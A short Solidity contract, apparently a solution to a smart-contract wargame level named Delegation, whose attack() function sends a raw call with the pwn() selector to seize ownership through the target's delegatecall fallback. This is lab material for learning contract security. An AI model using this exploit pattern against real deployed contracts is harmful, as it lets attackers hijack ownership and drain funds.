//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "./Delegation.sol";

contract N6Attacker{
    Delegation public delegation;

    constructor(address _delegation) {
        delegation = Delegation(_delegation);
    }

    function attack() public {
        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "N6Attacker:attack!success");
    }
}